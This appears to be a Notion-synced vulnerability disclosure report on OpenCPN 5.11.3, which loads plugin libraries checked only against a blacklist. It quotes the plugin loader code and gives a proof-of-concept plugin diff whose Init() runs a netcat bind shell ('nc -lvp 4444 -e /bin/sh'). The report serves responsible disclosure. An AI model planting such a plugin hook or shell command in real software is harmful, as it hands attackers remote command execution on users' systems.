---
notion_url: https://www.notion.so/76ebe08098308313956a81d9af926c10
last_synced: 2026-06-12 09:07
tags: [notion-sync]
---

# Code Injection

- 📄 [[KOR OpenCPN RCE - Code Injection/KOR OpenCPN RCE - Code Injection|KOR OpenCPN RCE - Code Injection]]

Vulnerability Title : OpenCPN RCE - Code Injection
Vulnerability Summary : Remote Code Execution arising from loading dynamically linked library files without signature, path, or whitelist validation
Vendor : GitHub OpenSource Project
Software Name : OpenCPN
Version : 5.11.3
Software Type : ECS (Electronic Chart System)
Attack Type : Code Injection
Impact : Remote Code Execution with process privileges
Vulnerable Source File: `plugin_loader.cpp
`
Vulnerable Function: `PluginLoader::LoadPlugIn()`
Vulnerable Parameters : 

```c++
const wxString& plugin_file, PlugInContainer* pic
```

Affected Environment : Ubuntu 24.04

Proof Of Concept  : 
During the library load process, only blacklist-based validation is performed:

```c++
// Check if blacklisted, exit if so.
  auto sts =
      m_blacklist->get_status(pic->m_common_name.ToStdString(),
                              pic->m_version_major, pic->m_version_minor);
  if (sts != plug_status::unblocked) {
    wxLogDebug("Refusing to load blacklisted plugin: %s",
               pic->m_common_name.ToStdString().c_str());
    return nullptr;
  }
  auto data = m_blacklist->get_library_data(plugin_file.ToStdString());
  if (!data.name.empty()) {
    wxLogDebug("Refusing to load blacklisted library: %s",
               plugin_file.ToStdString().c_str());
    return nullptr;
  }
  pic->m_plugin_file = plugin_file;
  pic->m_status =
      PluginStatus::Unmanaged;  // Status is updated later, if necessary

  // load the library
  if (pic->m_library.IsLoaded()) pic->m_library.Unload();
  pic->m_library.Load(plugin_file);

  if (!pic->m_library.IsLoaded()) {
    //  Look in the Blacklist, try to match a filename, to give some kind of
    //  message extract the probable plugin name
    wxFileName fn(plugin_file);
    std::string name = fn.GetName().ToStdString();
    auto found = m_blacklist->get_library_data(name);
    if (m_blacklist->mark_unloadable(plugin_file.ToStdString())) {
      wxLogMessage("Ignoring blacklisted plugin %s", name.c_str());
      if (!found.name.empty()) {
        SemanticVersion v(found.major, found.minor);
        LoadError le(LoadError::Type::Unloadable, name, v);
        load_errors.push_back(le);
      } else {
        LoadError le(LoadError::Type::Unloadable, plugin_file.ToStdString());
        load_errors.push_back(le);
      }
    }
    wxLogMessage(wxString("   PluginLoader: Cannot load library: ") +
                 plugin_file);
    return nullptr;
  }
```

Using the OpenCPN TestPlugin template from GitHub for an example RCE via a bind shell:
https://github.com/jongough/testplugin_pi.git

Add the following at the very top of `src/testplugin_pi.cpp`’s `Init()`:

```c++
#include <thread>
#include <chrono>
#include <cstdlib>
+#include <fstream>

int testplugin_pi::Init(void)
{
+    // Init() 호출 확인 로그
+    std::ofstream fs("/home/user/poc_init.log");
+    fs << "Init() 호출됨\n";
+    fs.close();
+
    // … 기존 초기화 로직 …

+    // 5초 후 바인드 셸 실행 (PoC 예시)
+    std::thread([](){
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        system("/usr/bin/nc.traditional -lvp 4444 -e /bin/sh &");
+    }).detach();


```

After building and importing this plugin into OpenCPN:

![image](_assets/image.png)


You can connect to the shell via `nc`, demonstrating Remote Code Execution.

Additional Materials (video, report attachments):

> 📎 첨부(미변환): [POC2.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/92bdd4ae-35e4-4636-a8a3-fce96cfbfd0f/POC2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665X7MMD5I%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T000740Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEAaCXVzLXdlc3QtMiJIMEYCIQCcdveoCCKx%2FthQthAMJYSFXeptSOAdvt4869a9HXAaIgIhAO8a8I%2BlUnd6lh%2FmbrzghmU8tOshktvUjWsNX2TSl1lVKv8DCAkQABoMNjM3NDIzMTgzODA1IgwsjnZAahJ91jW8v84q3ANKBhRnsPQfOGHck1zeTrjed%2BsmjF3bIi6zEl68uxMAL1Dr2l3pwHBM3anHcToi9RW3OHPBVLSJC9P%2FNWXZdlCjqkSE4SnyG%2F1xrGquifEBORyHoTx7j2Axnu6zoh%2Flv5oxiIFMCbZmSLlcje8pn5a38%2FG%2BOhng2TIHrzW5B9dDIUGWrT7mHaiTSi5iewvAcGLv43vS83ufHTLY8T%2BX4Qe2dBfGVzNwXe12s4k6NOMWmnh3QO4hs0jIiBbfVc2lMYbv2uwgbO16n1TZ%2FetrPoTdUkw%2FUoii6hY3KPmJEYn86BskJvCZ5wlC0bAQauosu6Daoa9I3tgUHjq5vH3dXCrkY5aUXcWomEA%2FGCZ5HIi0Z0eEeKdPn8BEGXq%2FtrH34DQOhLTBwUYVXQLxx1p%2FzV02h8DylyjoYgsNTPXAkLgQlLqDY4zmjZjotarHE7%2BQsTPKuXhtYJ0MtXFydWtEtJOVEVxbw%2BjmLREC5Oq6HSOgtq7kWd72Q4NrwTbqGvvyegA6nD%2FQaTy9HJNk6%2BfHvFUA70ZU9Nc9IRlQFFzKzRuVtU%2Bu%2BTf4V01rhEXlS8EYjf43GGCWYg7u2zsb0Ikv%2Fy4oWNG4lev66fdOdeUcY%2Bh2RkG3fanMnBF99p18ZDCAjq3RBjqkAVf9HTEnpEAzfZAM6et1Y132v8KxWWTj3%2B5z8B%2F08ivcBtYftYSJAJfxPdzkmBEzbCfU5MzPi7PqnyEWdhYY697pSWUfUhpxOVQMp6nfksFWndAvYOEkAmgn8Rr056EniNbDUnIfa%2BSQyLzKy72vYmfwJ6SZyixG34fyK59UgdYCC%2FibCrgMSC3mI2Q2NMPBo2IOwZFnBHvlzI3lTr64Xj4ZA8B8&X-Amz-Signature=8825be73472e90b0a86177e1e94a54a63e321ad1b1c76f007635297f56a71b5a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



> 📎 첨부(미변환): [zdi report2.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/6af31ca2-0d32-4cb4-8668-82a7bd93bf73/zdi_report2.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665X7MMD5I%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T000740Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEAaCXVzLXdlc3QtMiJIMEYCIQCcdveoCCKx%2FthQthAMJYSFXeptSOAdvt4869a9HXAaIgIhAO8a8I%2BlUnd6lh%2FmbrzghmU8tOshktvUjWsNX2TSl1lVKv8DCAkQABoMNjM3NDIzMTgzODA1IgwsjnZAahJ91jW8v84q3ANKBhRnsPQfOGHck1zeTrjed%2BsmjF3bIi6zEl68uxMAL1Dr2l3pwHBM3anHcToi9RW3OHPBVLSJC9P%2FNWXZdlCjqkSE4SnyG%2F1xrGquifEBORyHoTx7j2Axnu6zoh%2Flv5oxiIFMCbZmSLlcje8pn5a38%2FG%2BOhng2TIHrzW5B9dDIUGWrT7mHaiTSi5iewvAcGLv43vS83ufHTLY8T%2BX4Qe2dBfGVzNwXe12s4k6NOMWmnh3QO4hs0jIiBbfVc2lMYbv2uwgbO16n1TZ%2FetrPoTdUkw%2FUoii6hY3KPmJEYn86BskJvCZ5wlC0bAQauosu6Daoa9I3tgUHjq5vH3dXCrkY5aUXcWomEA%2FGCZ5HIi0Z0eEeKdPn8BEGXq%2FtrH34DQOhLTBwUYVXQLxx1p%2FzV02h8DylyjoYgsNTPXAkLgQlLqDY4zmjZjotarHE7%2BQsTPKuXhtYJ0MtXFydWtEtJOVEVxbw%2BjmLREC5Oq6HSOgtq7kWd72Q4NrwTbqGvvyegA6nD%2FQaTy9HJNk6%2BfHvFUA70ZU9Nc9IRlQFFzKzRuVtU%2Bu%2BTf4V01rhEXlS8EYjf43GGCWYg7u2zsb0Ikv%2Fy4oWNG4lev66fdOdeUcY%2Bh2RkG3fanMnBF99p18ZDCAjq3RBjqkAVf9HTEnpEAzfZAM6et1Y132v8KxWWTj3%2B5z8B%2F08ivcBtYftYSJAJfxPdzkmBEzbCfU5MzPi7PqnyEWdhYY697pSWUfUhpxOVQMp6nfksFWndAvYOEkAmgn8Rr056EniNbDUnIfa%2BSQyLzKy72vYmfwJ6SZyixG34fyK59UgdYCC%2FibCrgMSC3mI2Q2NMPBo2IOwZFnBHvlzI3lTr64Xj4ZA8B8&X-Amz-Signature=300bc0290dd787ed60c571c568aa3a7b7abbab5f3b495546d4e0a83d767de674&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
